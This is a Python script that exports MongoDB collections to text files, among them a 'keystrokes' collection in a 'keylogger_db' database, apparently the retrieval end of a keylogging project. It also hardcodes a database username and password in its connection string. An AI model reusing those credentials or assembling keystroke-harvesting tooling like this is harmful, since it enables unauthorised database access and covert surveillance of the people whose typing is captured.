import pymongo
import json
import os
from bson import ObjectId

# Conexión a MongoDB
def connect_to_mongodb(uri, database_name, collection_name):
    """Conecta a MongoDB y devuelve la colección especificada."""
    try:
        client = pymongo.MongoClient(uri)
        database = client[database_name]
        collection = database[collection_name]
        print(f"Conectado a la base de datos: {database_name}, colección: {collection_name}")
        return collection
    except pymongo.errors.ConnectionError as e:
        print(f"Error de conexión: {e}")
        return None

# Función para serializar objetos que no son serializables directamente a JSON
def json_serializer(obj):
    """Serializa tipos no serializables a JSON."""
    if isinstance(obj, ObjectId):
        return str(obj)
    # Agrega otros tipos si es necesario
    raise TypeError(f"Tipo no serializable: {type(obj)}")

# Exportar datos de MongoDB a un archivo TXT
def export_data_to_txt(collection, file_path):
    """Exporta los datos de una colección de MongoDB a un archivo .txt."""
    try:
        # Obtener todos los documentos de la colección
        documents = list(collection.find())

        # Verifica que la carpeta existe, si no, la crea
        directory = os.path.dirname(file_path)
        if not os.path.exists(directory):
            os.makedirs(directory)
        
        # Guardar los datos en un archivo TXT
        with open(file_path, 'w') as file:
            for document in documents:
                # Serializa los documentos y maneja ObjectId y otros tipos
                file.write(json.dumps(document, default=json_serializer) + '\n')

        print(f"Datos exportados exitosamente a {file_path}")

    except Exception as e:
        print(f"Error al exportar datos: {e}")

# Configura tus variables de conexión aquí
uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"  # Cambia esto si tu MongoDB está en otra dirección
database_name = "JarvisAI"  # Cambia esto al nombre de tu base de datos
collection_name = "prueba"  # Cambia esto al nombre de tu colección

# Conectar a la colección
collection = connect_to_mongodb(uri, database_name, collection_name)
collection2 =  connect_to_mongodb(uri, "keylogger_db", "keystrokes")

# Definir la dirección donde se guardará el archivo, asegurando la sintaxis correcta de la ruta
file_path = r"TEST\JarvisPhone\CodigoNuevoFuncional\Datos Extraidos\busquedas.txt"  # Cambia esta ruta a la dirección donde quieres guardar el archivo
file_path2 = r"TEST\JarvisPhone\CodigoNuevoFuncional\Datos Extraidos\keys.txt"  # Cambia esta ruta a la dirección donde quieres guardar el archivo

# Exportar los datos si la colección es válida
if 1 ==1:
    export_data_to_txt(collection, file_path)
    export_data_to_txt(collection2, file_path2)